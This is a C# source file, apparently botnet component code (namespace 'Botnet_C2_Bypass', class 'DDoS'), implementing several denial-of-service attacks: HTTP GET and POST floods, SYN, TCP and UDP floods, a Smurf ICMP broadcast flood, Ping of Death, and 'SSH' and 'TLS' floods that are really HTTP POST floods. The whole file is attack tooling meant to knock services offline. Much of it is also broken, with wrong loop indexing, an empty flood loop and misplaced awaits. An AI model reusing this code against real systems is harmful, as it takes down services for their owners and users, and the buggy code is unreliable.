using System;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;
using System.Collections;
using System.Diagnostics;

namespace Botnet_C2_Bypass
{
    public class DDoS 
    {
        public static async Task HttpGet(string url, int thread, int time)
        {
            Task[] tslks = new Task[thread];
            for (int i = 0; i < tslks.Length; i++)
            {
                tslks[i] = Task.Run(async () =>
                {
                    Stopwatch waitTime = new Stopwatch();
                    waitTime.Start();
                    await Task.WhenAll(Task.Run(async () => {
                        try
                        {
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                using (HttpClient client = new HttpClient())
                                {
                                    await client.GetAsync(url);
                                }
                            }
                        }
                        catch { }
                    }));
                    waitTime.Stop();
                });
            }
            await Task.WhenAll(tslks);
        }
        public static async Task SendSyn(string target, int port, int time, int thread)
        {
            TcpClient client = new TcpClient();
            Task[] sentSyn = new Task[thread];
            for (int i = 0; i < sentSyn.Length; i++)
            {
                Stopwatch waitTime = new Stopwatch();
                waitTime.Start();
                sentSyn[i] = Task.Run(async () =>
                {
                    await Task.WhenAll(Task.Run(() => {
                        try
                        {
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                client.ConnectAsync(target, port);
                                client.Close();
                            }
                        }
                        catch { }
                    }));
                    waitTime.Stop();
                });
                await Task.WhenAll(sentSyn);
            }
        }
        public static async Task SendTcp(string target, int port, int time, int thread,int bytelength)
        {
            byte[] buffer = new byte[bytelength];
            using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
            {
                rng.GetBytes(buffer);
            }
            TcpClient client = new TcpClient();
            NetworkStream stream = client.GetStream();
            Task[] sentSyn = new Task[thread];
            for (int i = 0; i < sentSyn.Length; i++)
            {
                sentSyn[i] = Task.Run(() =>
                {
                    Stopwatch st = new Stopwatch();
                    try
                    {
                        while (st.ElapsedMilliseconds <= time)
                        {
                            try
                            {
                                client.ConnectAsync(IPAddress.Parse(target),port);
                                stream.Write(buffer, 0, buffer.Length);
                                client.Close();
                            }
                            catch { }
                        }
                    }
                    catch { }; st.Stop();
                });
                Task.WaitAll(sentSyn);
            }
            
        }
        public static async Task SendSmurf(string target, int time, int thread)
        {
            Task[] sentICMP = new Task[thread];
            for (int i = 0; i < sentICMP.Length; i++)
            {
                sentICMP[i] = Task.Run(async () =>
                {
                    Stopwatch waitTime = new Stopwatch();
                    waitTime.Start();
                        try
                        {
                            IPAddress? localIP = Dns.GetHostEntry(target).AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                            string strLocalIp = localIP.ToString();
                            if (localIP != null)
                            {
                                byte[] localIPBytes = localIP.GetAddressBytes();
                                byte[] netmaskBytes = IPAddress.Parse(strLocalIp).GetAddressBytes();
                                byte[] broadcastBytes = new byte[4];

                                for (int v = 0; v < 4; v++)
                                {
                                    broadcastBytes[i] = (byte)(localIPBytes[i] | (~netmaskBytes[i]));
                                }

                                IPAddress broadcastIP = new IPAddress(broadcastBytes);
                                while (waitTime.ElapsedMilliseconds <= time)
                                {
                                    Ping ping = new Ping();
                                    PingOptions options = new PingOptions
                                    {
                                        DontFragment = true,
                                        Ttl = 64
                                    };
                                    PingReply reply = ping.Send(broadcastIP, 1000, new byte[32], options);

                                }
                            }
                        }
                        catch { }
                    waitTime.Stop();
                });
            }
           Task.WaitAll(sentICMP);
        }
        public static async Task PingOfDeath(string target, int time, int thread)
        {
            Task[] sentICMP = new Task[thread];
            for (int i = 0; i < sentICMP.Length; i++)
            {
                sentICMP[i] = Task.Run(async () =>
                {
                    Stopwatch waitTime = new Stopwatch();
                    waitTime.Start();
                    await Task.Factory.StartNew(() => {
                        try
                        {
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                Ping ping = new Ping();
                                PingOptions options = new PingOptions();
                                options.DontFragment = true;
                                byte[] buffer = new byte[65507];
                                using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                                {
                                    rng.GetBytes(buffer);
                                }
                                ping.Send(target, 1, buffer, options);
                            }
                        }
                        catch { }
                    });
                    waitTime.Stop();
                });
            }
            await Task.WhenAll(sentICMP);
        }
        public static async Task SendUdp(string target, int port, int time, int thread,int bytelength)
        {

            byte[] mess = new byte[1024];
            using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
            {
                rng.GetBytes(mess);
            }
            Task[] sentUdp = new Task[thread];
            for (int i = 0; i < sentUdp.Length; i++)
            {
                sentUdp[i] = Task.Run(async () =>
                {
                    await Task.WhenAll(Task.Run(() => {
                        try
                        {
                            Stopwatch waitTime = new Stopwatch();
                            waitTime.Start();
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                using (UdpClient udp = new UdpClient())
                                {
                                    udp.SendAsync(mess, mess.Length, target, port);
                                }
                            }
                            waitTime.Stop();
                        }
                        catch { }
                    }));
                });
                await Task.WhenAll(sentUdp);
            }
        }
        public static async Task HttpPost(string url, int thread, int time)
        {
            Task[] SentHttpPosts = new Task[thread];
            for (int i = 0; i < SentHttpPosts.Length; i++)
            {
                SentHttpPosts[i] = Task.Run(async () =>
                {
                    await Task.WhenAll(Task.Run(async () => {
                        try
                        {
                            Stopwatch waitTime = new Stopwatch();
                            waitTime.Start();
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                               
                            }
                            waitTime.Stop();
                        }
                        catch { }
                    }));
                });
            }
            await Task.WhenAll(SentHttpPosts);
        }
        public static async Task SSHFlood(string url, int thread, int time)
        {
            Task[] SentHttpPosts = new Task[thread];
            for (int i = 0; i < SentHttpPosts.Length; i++)
            {
                SentHttpPosts[i] = Task.Run(async () =>
                {
                    await Task.WhenAll(Task.Run(async () => {
                        try
                        {
                            Stopwatch waitTime = new Stopwatch();
                            waitTime.Start();
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                using (var httpClient = new HttpClient())
                                {
                                    var parameters = new Dictionary<string, string> { { "lolskisjskskskekd", "loloosksjzjz" }, { "KsnkdjnskPknskk", "Ojnndkjjjjj" } };
                                    var encodedContent = new FormUrlEncodedContent(parameters);
                                    var result = await httpClient.PostAsync(url, encodedContent);
                                }
                            }
                            waitTime.Stop();
                        }
                        catch { }
                    }));
                });
            }
            await Task.WhenAll(SentHttpPosts);
        }
        public static async Task TLSFlood(string url, int thread, int time)
        {
            Task[] SentHttpPosts = new Task[thread];
            for (int i = 0; i < SentHttpPosts.Length; i++)
            {
                SentHttpPosts[i] = Task.Run(async () =>
                {
                    await Task.WhenAll(Task.Run(async () => {
                        try
                        {
                            Stopwatch waitTime = new Stopwatch();
                            waitTime.Start();
                            while (waitTime.ElapsedMilliseconds <= time)
                            {
                                using (var httpClient = new HttpClient())
                                {
                                    var parameters = new Dictionary<string, string> { { "lolskisjskskskekd", "loloosksjzjz" }, { "KsnkdjnskPknskk", "Ojnndkjjjjj" } };
                                    var encodedContent = new FormUrlEncodedContent(parameters);
                                    var result = await httpClient.PostAsync(url, encodedContent);
                                }
                            }
                            waitTime.Stop();
                        }
                        catch { }
                    }));
                });
            }
            await Task.WhenAll(SentHttpPosts);
        }
    }
}